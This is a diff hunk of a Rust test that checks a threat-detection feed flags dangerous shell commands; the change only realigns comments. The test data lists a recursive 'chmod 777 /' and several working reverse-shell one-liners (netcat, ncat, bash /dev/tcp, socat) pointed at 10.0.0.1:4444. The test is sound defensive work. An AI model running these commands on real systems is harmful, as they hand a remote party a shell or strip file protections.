@@ -636,13 +636,13 @@ mod builtin_command_tests {
     fn flags_recursive_chmod_and_reverse_shells() {
         let feed = ThreatFeed::with_builtin_indicators();
         for cmd in [
-            "chmod -R 777 /",                              // flags between verb and mode
-            "chmod 777 /etc/hosts",                        // plain form still matches
-            "nc -e /bin/sh 10.0.0.1 4444",                 // netcat reverse shell (-e)
-            "nc -c /bin/sh 10.0.0.1 4444",                 // netcat reverse shell (-c)
-            "ncat -e /bin/bash 10.0.0.1 4444",             // ncat variant
-            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",      // bash /dev/tcp reverse shell
-            "socat TCP:10.0.0.1:4444 EXEC:/bin/bash",      // socat EXEC reverse shell
+            "chmod -R 777 /",                         // flags between verb and mode
+            "chmod 777 /etc/hosts",                   // plain form still matches
+            "nc -e /bin/sh 10.0.0.1 4444",            // netcat reverse shell (-e)
+            "nc -c /bin/sh 10.0.0.1 4444",            // netcat reverse shell (-c)
+            "ncat -e /bin/bash 10.0.0.1 4444",        // ncat variant
+            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", // bash /dev/tcp reverse shell
+            "socat TCP:10.0.0.1:4444 EXEC:/bin/bash", // socat EXEC reverse shell
         ] {
             assert!(
                 !feed.check_threats(cmd).is_empty(),
